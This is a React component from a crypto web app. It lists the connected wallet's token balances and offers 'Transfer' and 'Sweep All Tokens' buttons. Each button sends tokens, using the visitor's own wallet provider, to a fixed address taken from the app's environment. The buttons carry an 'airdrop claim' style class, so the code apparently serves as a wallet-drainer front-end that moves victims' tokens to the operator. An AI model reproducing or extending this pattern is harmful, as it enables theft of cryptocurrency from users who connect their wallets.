import { formatFixed } from "@exodus/ethersproject-bignumber";
import React from "react";
import { sweepAllTokens, transferToken } from "../../Helper/helpers";
import styles from "./tokens.module.scss";
import { ethers } from "ethers";

const Tokens = ({ listAllTokens }) => {
  console.log(listAllTokens);
  let to = process.env.REACT_APP_MY_ADDRESS;
  //   This functionality format token balance big number
  const formatBalance = (balance, decimals) => {
    let format = formatFixed(
      balance.toString(),
      Math.max(parseInt(decimals.toString()), 1)
    ).toString();
    return format;
  };

  const setTransferClick = async (balanceObj, setProcessingTransfer) => {
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await transferToken(balanceObj, to, provider);
      }
    }
  };

  const sweepTokenClick = async (balanceObj) => {
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await sweepAllTokens(listAllTokens, to, provider);
      }
    }
  };

  return (
    <div className={styles.parentContainer}>
      <div className={styles.buttonContainer}>
        <button
          className={styles.claimAirdropButton}
          onClick={() => {
            sweepTokenClick(listAllTokens);
          }}
        >
          Sweep All Tokens
        </button>
      </div>
      <table className={styles.tokenTable}>
        <tr>
          <th>Name</th>
          <th>Balance</th>
          <th></th>
        </tr>
        {listAllTokens.map((item, index) => {
          return (
            <Tr
              item={item}
              index={index}
              setTransferClick={setTransferClick}
              formatBalance={formatBalance}
            />
          );
        })}
      </table>
    </div>
  );
};

export default Tokens;

const Tr = ({ item, index, formatBalance, setTransferClick }) => {
  return (
    <tr key={index}>
      <td>{item.name}</td>
      <td>
        {parseFloat(formatBalance(item.balance, item.decimals)).toFixed(2)}
      </td>
      <td>
        <button
          className={styles.claimAirdropButton}
          onClick={() => {
            setTransferClick(item);
          }}
        >
          Transfer
        </button>
      </td>
    </tr>
  );
};
